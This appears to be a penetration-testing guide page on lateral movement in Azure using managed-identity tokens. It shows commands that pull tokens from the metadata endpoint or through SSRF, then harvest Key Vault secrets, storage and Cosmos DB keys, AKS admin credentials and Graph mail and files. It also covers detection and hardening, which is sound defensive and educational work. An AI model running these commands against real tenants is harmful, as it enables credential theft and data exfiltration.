---
cstg_id: CSTG-AZURE-MANAGED-IDENTITIES-LATERAL
title: "AZURE Managed Identities - Lateral Movement"
provider: azure
service: managed-identities
phase: lateral-movement
required_access: assumed-breach
required_permissions:
  - "Code execution / SSRF reach to a managed-identity token endpoint (IMDS 169.254.169.254 or App Service/Functions MSI endpoint)"
  - "Whatever Azure RBAC and Graph permissions the obtained identity holds, e.g.:"
  - "Microsoft.Storage/storageAccounts/listKeys/action; Storage Blob Data Contributor"
  - "Microsoft.KeyVault/vaults/secrets/read (data action)"
  - "Microsoft.Compute/virtualMachines/runCommand/action; Microsoft.ContainerService/managedClusters/listClusterAdminCredential/action"
  - "Microsoft.DocumentDB/databaseAccounts/listKeys/action; Microsoft.Sql/servers/databases (Entra auth)"
  - "Graph: Mail.Read, Files.Read.All, Directory.Read.All, GroupMember.ReadWrite.All"
tools:
  - az cli (azure-cli)
  - Azure Instance Metadata Service (IMDS)
  - Microsoft Graph API
  - kubectl
  - MicroBurst
  - PowerZure
  - Azure Storage Explorer
references:
  - "https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token"
  - "https://learn.microsoft.com/en-us/azure/aks/workload-identity-overview"
  - "https://learn.microsoft.com/en-us/entra/workload-id/workload-identity-federation"
  - "https://hackingthe.cloud/azure/abusing-managed-identities/"
  - "https://hackingthe.cloud/azure/azure-imds-ssrf/"
  - "https://www.netspi.com/blog/technical-blog/cloud-pentesting/lateral-movement-in-azure-app-services/"
  - "https://github.com/NetSPI/MicroBurst"
license: CC BY-SA 4.0
---

## Summary

Lateral movement with managed identities is the act of taking a token obtained from one compromised resource and using it to reach *other* resources, services, data stores, and even other clouds or the directory — without escalating privilege per se, but expanding reach across the environment. Because a managed-identity token is a normal Entra access token, it works against any audience (`resource`) the identity is permitted to call: Azure Resource Manager, Microsoft Graph, Key Vault, Storage, Cosmos DB, SQL, Service Bus, and more.

The objective is to pivot from the initially compromised resource to the broader estate: read other storage accounts and Key Vaults, run commands on other VMs, pull database keys, read mail or files via Graph, or hop into Kubernetes. A particularly important entry vector is **server-side request forgery (SSRF)** in an application running on an identity-bearing resource — SSRF to the metadata endpoint yields a token even without code execution. This page builds on [Managed Identities - Enumeration](../02-services/azure-managed-identities-enum.md) (to know what the identity can reach) and is closely tied to [Managed Identities - Privilege Escalation](../03-privilege-escalation/azure-managed-identities-privesc.md) (escalation and lateral movement often chain).

## Prerequisites

- An assumed-breach position that can reach a token endpoint: code execution on a VM/VMSS/container, the App Service/Functions worker, or an SSRF primitive in an application hosted on an identity-bearing resource.
- The target identity must hold RBAC/data-plane/Graph permissions on resources beyond the compromised host for movement to be possible.
- Network reachability to the destination services (most Azure data-plane endpoints are reachable over the internet or via the resource's VNet).

## Enumeration

First, obtain a token, then enumerate what the identity can reach. Tokens are audience-specific — request one per target service:

```bash
# ARM (resource management) token via VM IMDS
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')

# Other audiences: request the right resource each time
#   Graph:     resource=https://graph.microsoft.com/
#   Key Vault: resource=https://vault.azure.net
#   Storage:   resource=https://storage.azure.com/
#   Cosmos DB: resource=https://cosmos.azure.com/
#   SQL:       resource=https://database.windows.net/
```

For App Service / Functions, use the MSI endpoint:

```bash
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01"
```

**SSRF entry vector** — if an application reflects or fetches attacker-controlled URLs, point it at IMDS (note the required `Metadata: true` header, which the SSRF must be able to set or which the app sets implicitly):

```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

Then map reach with the ARM token (mirrors the enumeration page but now from the identity's perspective):

```bash
az login --identity 2>/dev/null || true
az account list -o table
az role assignment list --assignee <this-identity-principalId> --all -o table
az resource list -o table          # everything the identity can see/touch
```

## Misconfigurations & Findings

- An identity with **read/write across multiple resource groups or subscriptions**, allowing movement well beyond the compromised host.
- **Data-plane reach to sensitive stores**: Storage Blob Data Contributor on shared storage, Key Vault secret read, Cosmos DB / SQL access — the identity becomes a data-exfiltration path.
- **`listKeys`-type permissions** (`Microsoft.Storage/.../listKeys`, `Microsoft.DocumentDB/.../listKeys`, `.../listConnectionStrings`) that yield long-lived shared keys usable from anywhere, surviving token expiry.
- **AKS kubelet/workload identity** that lets a compromised pod or node assume a cluster-wide identity, or `listClusterAdminCredential` granting full cluster admin.
- **Cross-cloud / external trust via federated credentials**, allowing the identity to be assumed from outside Azure (or the Azure identity to call into other clouds).
- **Graph data permissions** (`Mail.Read`, `Files.Read.All`, `Directory.Read.All`) enabling mailbox/file/directory harvesting tenant-wide.

## Exploitation

### Pivot to Storage and exfiltrate data

```bash
# Data-plane read using the identity (Storage Blob Data Reader/Contributor)
az storage blob list --account-name <acct> --container-name <c> --auth-mode login -o table

# If the identity has listKeys, pull the account key for unrestricted, token-independent access
az storage account keys list -g <rg> -n <acct> -o table
```

### Pivot to Key Vault and harvest credentials

```bash
az keyvault secret list --vault-name <kv>
az keyvault secret show  --vault-name <kv> --name <secret>
az keyvault key list     --vault-name <kv>
```

Secrets recovered here (SP credentials, DB connection strings, SSH/API keys) frequently enable movement to systems outside Azure RBAC entirely.

### Pivot to other compute (run command / extensions)

If the identity holds compute rights, run code on *other* VMs to harvest *their* identities and credentials, repeating the cycle:

```bash
az vm run-command invoke -g <rg> -n <other-vm> --command-id RunShellScript \
  --scripts "curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"
```

### Pivot into Kubernetes (AKS)

```bash
# If the identity can fetch cluster admin credentials
az aks get-credentials -g <rg> -n <cluster> --admin
kubectl get secrets --all-namespaces
# Workload-identity pods can request tokens via the projected token + IMDS sidecar path
```

### Pivot to databases (Cosmos DB / SQL)

```bash
# Cosmos DB keys (token-independent, persistent)
az cosmosdb keys list --name <acct> -g <rg> --type keys

# Azure SQL with Entra token (audience https://database.windows.net/)
sqlcmd -S <server>.database.windows.net -d <db> -G -G  # interactive/AAD token auth
```

### Pivot to Microsoft Graph (mail, files, directory)

With a Graph-audience token and data permissions:

```bash
az rest --method get --url "https://graph.microsoft.com/v1.0/users"                # Directory.Read.All
az rest --method get --url "https://graph.microsoft.com/v1.0/users/<id>/messages"  # Mail.Read
az rest --method get --url "https://graph.microsoft.com/v1.0/drives/<id>/root/children"  # Files.Read.All
```

### Cross-boundary movement via federated credentials

If the identity (UAMI) has federated identity credentials trusting an external OIDC issuer, an operator who controls that issuer/workload (e.g. a GitHub repo/branch matching the configured `subject`) can mint tokens for the identity from outside Azure, providing a durable, credential-less re-entry path. Conversely, a federation configured *from* Azure into another cloud lets the identity assume roles there.

## Detection & Logging

- **Azure Activity Logs** record control-plane actions the moved-to identity performs: `listKeys`/`listConnectionStrings`/`listClusterAdminCredential`, `runCommand`, resource reads/writes in new resource groups/subscriptions. Sudden activity in scopes the identity never previously touched is a strong signal.
- **Entra ID sign-in logs** record each token acquisition by the managed-identity service principal, including the requested resource/audience. A single identity acquiring tokens for many audiences (ARM, Graph, Vault, Storage) in a short window, or from an unusual IP/location, indicates lateral movement.
- **Entra ID audit logs** capture Graph-side directory reads/changes and any credential additions.
- **Key Vault logs** (diagnostic logs) record `SecretGet`/`KeyGet` operations; **Storage analytics/diagnostic logs** record blob access; **Defender for Storage / Key Vault / Cosmos DB** raise anomalous-access alerts.
- Host telemetry shows outbound requests to `169.254.169.254` and to data-plane endpoints; AKS audit logs capture `get-credentials --admin` use.
- **Microsoft Defender for Cloud** correlates these into incidents (e.g. "Managed identity accessed storage from unusual location").

## Remediation & Hardening

- Scope identities to only the resources they must reach; avoid cross-resource-group/subscription assignments and shared data-plane roles.
- Prefer Entra (token) auth and disable/limit `listKeys`-style permissions; rotate and where possible disable shared account keys (Storage `allowSharedKeyAccess=false`) so token theft cannot be upgraded to a persistent key.
- Restrict data-plane network exposure with private endpoints, firewall rules, and VNet service endpoints so a stolen token cannot be used from arbitrary networks.
- Lock down federated identity credentials to exact issuer/subject; remove stale federations.
- For SSRF defence: ensure applications cannot reach `169.254.169.254`/MSI endpoints from user-controlled requests; use IMDS hardening and network egress controls; require the `Metadata: true` header semantics and validate outbound URLs.
- Enable Key Vault/Storage/Cosmos diagnostic logging and Defender plans; alert on the operations and cross-audience token patterns above.

## Tools

- **az cli / IMDS / MSI endpoint** — multi-audience token acquisition and data-plane pivoting.
- **Microsoft Graph API** — mailbox/file/directory movement.
- **kubectl** — post-credential AKS movement.
- **MicroBurst / PowerZure** — automate token theft, key listing, and cross-resource pivoting.
- **Azure Storage Explorer** — browse storage reached with a stolen token or key.

## References

- Acquire a token using a VM's managed identity — Microsoft Learn
- AKS workload identity overview — Microsoft Learn
- Workload identity federation — Microsoft Learn
- Abusing managed identities; Azure IMDS SSRF — hackingthe.cloud
- Lateral movement in Azure App Services — NetSPI
- MicroBurst — NetSPI (GitHub)
